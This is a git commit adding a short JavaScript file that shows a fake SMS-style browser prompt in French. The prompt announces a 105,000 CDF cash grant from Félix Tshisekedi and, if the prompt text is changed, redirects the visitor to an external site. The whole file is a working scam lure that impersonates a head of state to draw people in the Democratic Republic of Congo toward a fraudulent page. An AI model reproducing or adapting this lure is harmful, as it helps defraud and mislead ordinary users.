82e66ec6b06eefd1b66241765a3c8852ae143e18
surebanga <erongukpe@gmail.com>
2025-06-01 08:18:36 +0100

    Create congo-active.js

---
+++ congo-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 105 000 CDF'
+password=prompt('SMS: Félicitations, vous êtes parmi les sélectionnés pour recevoir une subvention en espèces de 105 000 CDF de Félix Tshisekedi, cliquez sur OK pour retirer ','RETIRER 105 000 CDF');
+if (password != 'RETIRER 105 000 CDF') {
+location.href='https://surebanga.com/dr-congo.html';
+}
